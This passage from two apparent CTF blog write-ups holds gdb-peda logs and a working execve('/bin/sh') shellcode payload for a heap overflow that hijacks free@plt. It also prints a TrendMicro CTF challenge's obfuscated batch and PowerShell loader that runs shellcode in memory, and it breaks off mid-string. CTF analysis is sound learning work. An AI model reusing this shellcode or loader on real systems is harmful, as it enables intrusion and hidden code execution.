0x4 0004| 0xffffd314 --&gt; 0x804a008 ('A' &lt;repeats 200 times&gt;...)0008| 0xffffd318 --&gt; 0x804a110 --&gt; 0x0 0012| 0xffffd31c --&gt; 0x80485c1 (&lt;__libc_csu_init+33&gt;: lea eax,[ebx-0xf8])0016| 0xffffd320 --&gt; 0xffffd340 --&gt; 0x4 0020| 0xffffd324 --&gt; 0x0 0024| 0xffffd328 --&gt; 0x0 0028| 0xffffd32c --&gt; 0xf7e22637 (&lt;__libc_start_main+247&gt;: add esp,0x10)[------------------------------------------------------------------------------]Legend: code, data, rodata, value0x0804853f 18 buf3 = malloc(256); /* Prereq 3 */gdb-peda$ 到后面strcpy()之后 123456789101112131415161718192021222324252627 [----------------------------------registers-----------------------------------]EAX: 0x8049830 (&quot;AAAA&quot;)EBX: 0xffffd340 --&gt; 0x4 ECX: 0xffffd722 (&quot;AAAA&quot;)EDX: 0x8049830 (&quot;AAAA&quot;)ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd328 --&gt; 0x0 ESP: 0xffffd2fc --&gt; 0x8048564 (&lt;main+185&gt;: add esp,0x10)EIP: 0x41414141 ('AAAA')EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]Invalid $PC address: 0x41414141[------------------------------------stack-------------------------------------]0000| 0xffffd2fc --&gt; 0x8048564 (&lt;main+185&gt;: add esp,0x10)0004| 0xffffd300 --&gt; 0x8049830 (&quot;AAAA&quot;)0008| 0xffffd304 --&gt; 0xffffd722 (&quot;AAAA&quot;)0012| 0xffffd308 --&gt; 0x10 0016| 0xffffd30c --&gt; 0x80485eb (&lt;__libc_csu_init+75&gt;: add edi,0x1)0020| 0xffffd310 --&gt; 0x4 0024| 0xffffd314 --&gt; 0x804a008 ('A' &lt;repeats 200 times&gt;...)0028| 0xffffd318 --&gt; 0x804a110 --&gt; 0x0 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGSEGV0x41414141 in ?? ()gdb-peda$ 该变下payload 123456789shellcode = &quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62&quot;shellcode += &quot;\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0&quot;shellcode += &quot;\\x0b\\xcd\\x80&quot;payload = &quot;&quot;payload += &quot;\\x90&quot;*10 + shellcode + &quot;A&quot;*(260-10-len(shellcode))payload += &quot;\\xff\\xff\\xff\\xff&quot;payload += &quot; &quot; + &quot;0xFFFFF718&quot;payload += &quot; &quot; + &quot;\\x08\\xa0\\x04\\x08&quot;print payload gdb log这边 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071[----------------------------------registers-----------------------------------]EAX: 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 EBX: 0xffffd340 --&gt; 0x4 ECX: 0xffffd721 --&gt; 0x804a008 --&gt; 0x90909090 EDX: 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd328 --&gt; 0x0 ESP: 0xffffd300 --&gt; 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 EIP: 0x804855f (&lt;main+180&gt;: call 0x8048340 &lt;free@plt&gt;)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048556 &lt;main+171&gt;: add esp,0x10 0x8048559 &lt;main+174&gt;: sub esp,0xc 0x804855c &lt;main+177&gt;: push DWORD PTR [ebp-0xc]=&gt; 0x804855f &lt;main+180&gt;: call 0x8048340 &lt;free@plt&gt; 0x8048564 &lt;main+185&gt;: add esp,0x10 0x8048567 &lt;main+188&gt;: sub esp,0xc 0x804856a &lt;main+191&gt;: push DWORD PTR [ebp-0x10] 0x804856d &lt;main+194&gt;: call 0x8048340 &lt;free@plt&gt;Guessed arguments:arg[0]: 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 [------------------------------------stack-------------------------------------]0000| 0xffffd300 --&gt; 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 0004| 0xffffd304 --&gt; 0xffffd721 --&gt; 0x804a008 --&gt; 0x90909090 0008| 0xffffd308 --&gt; 0x10 0012| 0xffffd30c --&gt; 0x80485eb (&lt;__libc_csu_init+75&gt;: add edi,0x1)0016| 0xffffd310 --&gt; 0x4 0020| 0xffffd314 --&gt; 0x804a008 --&gt; 0x90909090 0024| 0xffffd318 --&gt; 0x804a110 --&gt; 0x0 0028| 0xffffd31c --&gt; 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 [------------------------------------------------------------------------------]Legend: code, data, rodata, value0x0804855f 21 free(buf3);gdb-peda$ pdisass 0x8048340Dump of assembler code from 0x8048340 to 0x8048360:: Dump of assembler code from 0x8048340 to 0x8048360: 0x08048340 &lt;free@plt+0&gt;: jmp DWORD PTR ds:0x8049830 0x08048346 &lt;free@plt+6&gt;: push 0x0 0x0804834b &lt;free@plt+11&gt;: jmp 0x8048330 0x08048350 &lt;strcpy@plt+0&gt;: jmp DWORD PTR ds:0x8049834 0x08048356 &lt;strcpy@plt+6&gt;: push 0x8 0x0804835b &lt;strcpy@plt+11&gt;: jmp 0x8048330End of assembler dump.gdb-peda$ pdisass 0x804a008Dump of assembler code from 0x804a008 to 0x804a028:: Dump of assembler code from 0x804a008 to 0x804a028: 0x0804a008: nop 0x0804a009: nop 0x0804a00a: nop 0x0804a00b: nop 0x0804a00c: nop 0x0804a00d: nop 0x0804a00e: nop 0x0804a00f: nop 0x0804a010: nop 0x0804a011: nop 0x0804a012: xor eax,eax 0x0804a014: push eax 0x0804a015: push 0x68732f2f 0x0804a01a: push 0x6e69622f 0x0804a01f: mov ebx,esp 0x0804a021: push eax 0x0804a022: mov edx,esp 0x0804a024: push ebx 0x0804a025: mov ecx,esp 0x0804a027: mov al,0xbEnd of assembler dump.gdb-peda$ cContinuing.process 9711 is executing new program: /bin/dashError in re-setting breakpoint 1: Function &quot;main&quot; not defined.$ 5.hol TBU 6.hoc TBU","link":"/2016/09/16/Malloc-Maleficarum-%E5%A4%8D%E7%9B%98/"},{"title":"TrendMicro CTF 2017 Reverse300","text":"0x00:比赛的时候看了这个题目，当时解编码的时候出了点问题，没解出来，后来发现是Powershell没分析对… 0x01:1234567891011121314151617181920212223242526@echo offset j=Thank_You_For_Joining_TMCTF2017set k=Tested on Win7SP1 32-bit OSset l=2eub2XQk9DHSsncxyWSLcTCLdgyLdhyLRgiLfiCLNjhPGHXzWQHR/+Fgi2wkJItFPItUKHgB6otKGItaIAHr4zRJizSLAe4x/zHA/KyEwHQHwc8NAcfr9Dt8JC%j:~1,1%14YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcOyCCnUieWJwmiOTg7sUuif////iUUEu37Y4nOHHCRS6I7///+set m=moAsSAMOY%02maCkAOwBsdf%smadfdf9z///+qamogG8AZABSDGsaSSwhmzWMOYsA+/masdgmoKYqWTAGEAaQBuAC4ARAB//IAbA==set n=LABNAmaodSDGASJOIHGI76msdm%ls:1qwerATSAYUDBGOSSnsAMIOLM//sogs+AuAFasgqQQYYHAFAZ2%:~QBtAGIAbABdABEA+set o=JRQhobGwgQWgzMi5kaHVzZXIw24hcJAqJ5lb/VQSJwlC7qKJNvIccJFLoX////2hyb1ggaGRNaWNoVHJlbjHbiFwkConjaCF9WCBoZ2FpbmhzTWVBaCFJdEloaGVyZWhsbG9UaEZ7SGVoVE1DVDHJiEwkHonhMdJSU1FS/9AxwFD/VQg=set p=GUAZQBwACgAOQAwACkAOwBGOALAHIAeQB7AGYAdQBuAGMAdABpAG8AbgAgAGcAZABlAGwAZQBnAGEAdABlAHsAUABhAHIAYQBtACAAKABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQBGOALAGkAbwBuADGOALAMAAsAEGOALAYQBuAGQAYQBGOALAG8AcgB5ADGOALAJABUAHIAdQBlACkAXQAgAFsAVAB5AHAAZQBbAFGOALAXQAgACQAUABhAHIAYQBtAGUAdABlAHIAcwAsAFsAUABhAHIAYQBtAGUAdABlAHIAKABQAG8AcwBpAHQAaQBvAG4APQAxACkAXQAgAFsAVAB5AHAAZQBdACAAJABSAGUAdAB1AHIAbgBUAHkAcABlADGOALAWwBWAG8AaQBkAFGOALAKQA7ACQAVAB5AHAAZQBCAHUAaQBsAGQAZQByADGOALAWwBBAHAAcABEAG8AbQBhAGkAbgBdADoAOgBDAHUAcgByAGUAbgBGOALAEQAbwBtAGEAaQBuAC4ARABlAGYAaQBuAGUARAB5AG4AYQBtAGkAYwBBAHMAcwBlAGGOALAYgBsAHkAKAAoAE4AZQB3ACGOALATwBiAGoAZQBjAHQAIABTAHkAcwBGOALAGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAGGOALAYgBsAHkATgBhAGGOALAZQAoACIAUgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlACIAKQApACwAWwBTAHkAcwBGOALAGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBFAGGOALAaQBGOALAC4AQQBzAHMAZQBtAGIAbAB5AEIAdQBpAGwAZABlAHIAQQBjAGMAZQBzAHMAXQA6ADoAUgB1AG4AKQAuAEQAZQBmAGkAbgBlAEQAeQBuAGEAbQBpAGMATQBvAGQAdQBsAGUAKAAiAEkAbgBNAGUAbQBvAHIAeQBNAG8AZAB1AGwAZQAiACwAJABmAGEAbABzAGUAKQAuAEQAZQBmAGkAbgBlAFQAeQBwAGUAKAAiAFgAWABYACIALAAiAEMAbABhAHMAcwAsAFAAdQBiAGwAaQBjACwAUwBlAGEAbABlAGQALABBAG4Acw^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%0gBSAHUAbgBGOALAGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBIAGEAbgBkAGwAZQBSAGUAZgBdACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAGGOALAZQAuAEkAbgBGOALAGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKAAoAE4AZQB3ACGOALATwBiAGoAZQBjAHQAIABJAG4AdABQAHQAcgApACwAJABVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAC4ARwBlAHQATQBlAHQAaABvAGQAKAAiAEcAZQBGOALAEGOALAbwBkAHUAbABlAEgAYQBuAGQAbABlACIAKQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAQAAoACQATQBvAGQAdQBsAGUAKQApACkAKQAsACQAUAByAG8AYwBlAGQAdQByAGUAKQApADsAfQBbAEIAeQBGOALAGUAWwBdAFGOALAJABzAGMAMwAyACAAPQAgAFsAUwB5AHMAdABlAGGOALALgBDAG8AbgB2AGUAcgBGOALAFGOALAOgA6AEYAcgBvAGGOALAQgBhAHMAZQA2ADQAUwBGOALAHIAaQBuAGcAKAAkAGUAbgB2ADoAbAArACQAZQBuAHYAOgBPACkAOwAkAGEAPQBHAGUAdAAtAEQAYQBGOALAGUAOwBpAGYAKAAkAGEALgBNAG8AbgBGOALAGgAIAAtAGcAZQAgADIAKQB7AGUAeABpAHQAOwB9AFsAVQBpAG4AdAAzADIAWwBdAFGOALAIAAkAG8AcAA9ADAAOwAkAHIAPQAoAFsAUwB5AHMAdABlAGGOALALgBSAHUAbgBGOALAGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAFGOALAOgA6AEcAZQBGOALAEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgBGOALAGUAcgAoACgAZwBwAHIAbwBjACAAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIABWAGkAcgBGOALAHUAYQBsAFAAcgBvAHQAZQBjAHQAKQAsACgAZwBkAGUAbABlAGcAYQBGOALAGUAIABAACgAWwBCAHkAdABlAFsAXQBdACwAWwBVAEkAbgBGOALADMAMgBdACwAWwBVAEkAbgBGOALADMAMgBdACwAWwBVAEkAbgBGOALADMAMgBbAFGOALAXQApACAAKABbAEkAbgBGOALAFAAdAByAFGOALAKQApACkAKQAuAEkAbgB2AG8AawBlACgAJABzAGMAMwAyACwAJABzAGMAMwAyAC4ATABlAG4AZwBGOALAGgALAAwAHgANAAwACwAJABvAHAAKQA7AGkAZgAoACQAcgAgACGOALAZQBxACAAMAApAHsAJABwAHIAPQAoAFsAUwB5AHMAdABlAGGOALALgBSAHUAbgBGOALAGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAFGOALAOgA6AEcAZQBGOALAEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgBGOALAGUAcgAoACgAZwBwAHIAbwBjACAAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIABWAGkAcgBGOALAHUAYQBsAEEAbABsAG8AYwApACwAKABnAGQAZQBsAGUAZwBhAHQAZQAgAEAAKABbAEkAbgBGOALAFAAdAByAFGOALALABbAFUASQBuAHQAMwAyAFGOALALABbAFUASQBuAHQAMwAyAFGOALALABbAFUASQBuAHQAMwAyAFGOALAKQAgACgAWwBVAEkAbgBGOALADMAMgBdACkAKQApACkALgBJAG4AdgBvAGsAZQAoADAALAAkAHMAYwAzADIALgBMAGUAbgBnAHQAaAAsADAAeAAzADAAMAAwACwAMAB4ADQAMAApADsAaQBmACgAJABwAHIAIAAtAG4AZQAgADAAKQB7ACQAbQBlAGGOALAcwBlAHQAPQAoAFsAUwB5AHMAdABlAGGOALALgBSAHUAbgBGOALAGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQ^BsAFGOALAOgA6AEcAZQBGOALAEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgBGOALAGUAcgAoACgAZwBwAHIAbwBjACAAbQBzAHYAYwByAHQALgBkAGwAbAAgAGGOALAZQBtAHMAZQBGOALACkALAAoAGcAZABlAGwAZQBnAGEAdABlACAAQAAoAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQApACAAKABbAEkAbgBGOALAFAAdAByAFGOALAKQApACkAKQA7AGYAbwByACAAKAAkAGkAPQAwADsAJABpACAALQBsAGUAIAAoACQAcwBjADMAMgAuAEwAZQBuAGcAdABoACGOALAMQApADsAJABpACsAKwApACAAewAkAGGOALAZQBtAHMAZQBGOALAC4ASQBuAHYAbwBrAGUAKAAoACQAcAByACsAJABpACkALAAgACQAcwBjADMAMgBbACQAaQBdACwAIAAxACkAfQA7ACgAWwBTAHkAcwBGOALAGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAEGOALAYQByAHMAaABhAGwAXQA6ADoARwBlAHQARABlAGwAZQBnAGEAdABlAEYAbwByAEYAdQBuAGMAdABpAG8AbgBQAG8AaQBuAHQAZQByACgAKABnAHAAcgBvAGMAIABrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACkALAAoAGcAZABlAGwAZQBnAGEAdABlACAAQAAoAFsASQBuAHQAUABGOALAHIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsASQBuAHQAUABGOALAHIAXQApACAAKABbAEkAbgBGOALAFAAdAByAFGOALAKQApACkAKQAuAEkAbgB2AG8AawBlACgAMAAsADAALAAkAHAAcgAsACQAcAByACwAMAAsADAAKQA7AHGOALAfQBlAGwAcwBlAHsAKABbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAGGOALAZQAuAEkAbgBGOALAGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBHAGUAdABEAGUAbABlAGcAYQBGOALAGUARgBvAHIARgB1AG4AYwBGOALAGkAbwBuAFAAbwBpAG4AdABlAHIAKAAoAGcAcAByAG8AYwAgAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACAAQwByAGUAYQBGOALAGUAVABoAHIAZQBhAGQAKQAsACgAZwBkAGUAbABlAGcAYQBGOALAGUAIABAACgAWwBJAG4AdABQAHQAcgBdACwAWwBVAEkAbgBGOALADMAMgBdACwAWwBCAHkAdABlAFsAXQBdACwAWwBCAHkAdABlAFsAXQBdACwAWwBVAEkAbgBGOALADMAMgBdACwAWwBJAG4AdABQAHQAcgBdACkAIAAoAFsASQBuAHQAUABGOALAHIAXQApACkAKQApAC4ASQBuAHYAbwBrAGUAKAAwACwAMAAsACQAcwBjADMAMgAsACQAcwBjADMAMgAsADAALAAwACkAOwB9AHMAbABlAGUAcAAoADEAMgAwADAAKQA7AHGOALAYwBhAHQAYwBoAHsAfQBlAHgAaQBGOALADsA&quot;cmd /c &quot;powershell -command &quot;$a=get-date;$t=[system.Text.Encoding]::UTF8.GetBytes('fzEvD');for ($i=0;$i -le ($t.Length-1);$i++){$t[$i]=$t[$i]-$a.hour} $d=[system.Text.Encoding]::UTF8.GetString($t);[Environment]::SetEnvironmentVariable('q', $d, 'User');&quot;cmd /c &quot;powershell -enc %q%%p:GOAL=0% &gt; NULecho %j%echo %q%set j=set k=set l=set m=set n=set o=set p= 直接添加一个 1echo %p:GOAL=0% 然后写脚本跑这个hour，看看到底是多少。 问题在于echo出来的这个p，中间有一个.号，导致解码失败。。。之前一直没发现这个。手动替换一个A过去。 123456789101112131415161718192021import base64base = &quot;GUAZQBwACgAOQAwACkAOwB0AHIAeQB7AGYAdQBuAGMAdABpAG8AbgAgAGcAZABlAGwAZQBnAGEAdABlAHsAUABhAHIAYQBtACAAKABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQB0AGkAbwBuAD0AMAAsAE0AYQBuAGQAYQB0AG8AcgB5AD0AJABUAHIAdQBlACkAXQAgAFsAVAB5AHAAZQBbAF0AXQAgACQAUABhAHIAYQBtAGUAdABlAHIAcwAsAFsAUABhAHIAYQBtAGUAdABlAHIAKABQAG8AcwBpAHQAaQBvAG4APQAxACkAXQAgAFsAVAB5AHAAZQBdACAAJABSAGUAdAB1AHIAbgBUAHkAcABlAD0AWwBWAG8AaQBkAF0AKQA7ACQAVAB5AHAAZQBCAHUAaQBsAGQAZQByAD0AWwBBAHAAcABEAG8AbQBhAGkAbgBdADoAOgBDAHUAcgByAGUAbgB0AEQAbwBtAGEAaQBuAC4ARABlAGYAaQBuAGUARAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAoACIAUgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlACIAKQApACwAWwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBFAG0AaQB0AC4AQQBzAHMAZQBtAGIAbAB5AEIAdQBpAGwAZABlAHIAQQBjAGMAZQBzAHMAXQA6ADoAUgB1AG4AKQAuAEQAZQBmAGkAbgBlAEQAeQBuAGEAbQBpAGMATQBvAGQAdQBsAGUAKAAiAEkAbgBNAGUAbQBvAHIAeQBNAG8AZAB1AGwAZQAiACwAJABmAGEAbABzAGUAKQAuAEQAZQBmAGkAbgBlAFQAeQBwAGUAKAAiAFgAWABYACIALAAiAEMAbABhAHMAcwAsAFAAdQBiAGwAaQBjACwAUwBlAGEAbABlAGQALABBAG4AcwBpAEMAbABhAHMAcwAsAEEAdQB0AG8AQwBsAGEAcwBzACIALABbAFMAeQBzAHQAZQBtAC4ATQB1AGwAdABpAGMAYQBzAHQARABlAGwAZQBnAGEAdABlAF0AKQA7ACQAVAB5AHAAZQBCAHUAaQBsAGQAZQByAC4ARABlAGYAaQBuAGUAQwBvAG4AcwB0AHIAdQBjAHQAbwByACgAIgBSAFQAUwBwAGUAYwBpAGEAbABOAGEAbQBlACwASABpAGQAZQBCAHkAUwBpAGcALABQAHUAYgBsAGkAYwAiACwAWwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBDAGEAbABsAGkAbgBnAEMAbwBuAHYAZQBuAHQAaQBvAG4AcwBdADoAOgBTAHQAYQBuAGQAYQByAGQALAAkAFAAYQByAGEAbQBlAHQAZQByAHMAKQAuAFMAZQB0AEkAbQBwAGwAZQBtAGUAbgB0AGEAdABpAG8AbgBGAGwAYQBnAHMAKAAiAFIAdQBuAHQAaQBtAGUALABNAGEAbgBhAGcAZQBkACIAKQA7ACQAVAB5AHAAZQBCAHUAaQBsAGQAZQByAC4ARABlAGYAaQBuAGUATQBlAHQAaABvAGQAKAAiAEkAbgB2AG8AawBlACIALAAiAFAAdQBiAGwAaQBjACwASABpAGQAZQBCAHkAUwBpAGcALABOAGUAdwBTAGwAbwB0ACwAVgBpAHIAdAB1AGEAbAAiACwAJABSAGUAdAB1AHIAbgBUAHkAcABlACwAJABQAGEAcgBhAG0AZQB0AGUAcgBzACkALgBTAGUAdABJAG0AcABsAGUAbQBlAG4AdABhAHQAaQBvAG4ARgBsAGEAZwBzACgAIgBSAHUAbgB0AGkAbQBlACwATQBhAG4AYQBnAGUAZAAiACkAOwByAGUAdAB1AHIAbgAgACQAVAB5AHAAZQBCAHUAaQBsAGQAZQByAC4AQwByAGUAYQB0AGUAVAB5AHAAZQAoACkAOwB9AGYAdQBuAGMAdABpAG8AbgAgAGcAcAByAG8AYwB7AFAAYQByAGEAbQAgACgAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgA9ADAALABNAGEAbgBkAGEAdABvAHIAeQA9ACQAVAByAHUAZQApAF0AIABbAFMAdAByAGkAbgBnAF0AIAAkAE0AbwBkAHUAbABlACwAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgA9ADEALABNAGEAbgBkAGEAdABvAHIAeQA9ACQAVAByAHUAZQApAF0AIABbAFMAdAByAGkAbgBnAF0AIAAkAFAAcgBvAGMAZQBkAHUAcgBlACkAOwAkAFMAeQBzAHQAZQBtAEEAcwBzAGUAbQBiAGwAeQA9AFsAQQBwAHAARABvAG0AYQBpAG4AXQA6ADoAQwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgAuAEcAZQB0AEEAcwBzAGUAbQBiAGwAaQBlAHMAKAApAHwAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAewAkAF8ALgBHAGwAbwBiAGEAbABBAHMAcwBlAG0AYgBsAHkAQwBhAGMAaABlACAALQBBAG4AZAAgACQAXwAuAEwAbwBjAGEAdABpAG8AbgAuAFMAcABsAGkAdAAoACIAXAAiACkAWwAtADEAXQAuAEUAcQB1AGEAbABzACgAIgBTAHkAcwB0AGUAbQAuAGQAbABsACIAKQB9ADsAJABVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAD0AJABTAHkAcwB0AGUAbQBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAIgBNAGkAYwByAG8AcwBvAGYAdAAuAFcAaQBuADMAMgAuAFUAbgBzAGEAZgBlAE4AYQB0AGkAdgBlAE0AZQB0AGgAbwBkAHMAIgApADsAcgBlAHQAdQByAG4AIAAkAFUAbgBzAGEAZgBlAE4AYQB0AGkAdgBlAE0AZQB0AGgAbwBkAHMALgBHAGUAdABNAGUAdABoAG8AZAAoACIARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACIAKQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAQAAoAFsAUwB5AHMAdABlAG0ALABATgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBIAGEAbgBkAGwAZQBSAGUAZgBdACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAG4AdABQAHQAcgApACwAJABVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAC4ARwBlAHQATQBlAHQAaABvAGQAKAAiAEcAZQB0AE0AbwBkAHUAbABlAEgAYQBuAGQAbABlACIAKQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAQAAoACQATQBvAGQAdQBsAGUAKQApACkAKQAsACQAUAByAG8AYwBlAGQAdQByAGUAKQApADsAfQBbAEIAeQB0AGUAWwBdAF0AJABzAGMAMwAyACAAPQAgAFsAUwB5AH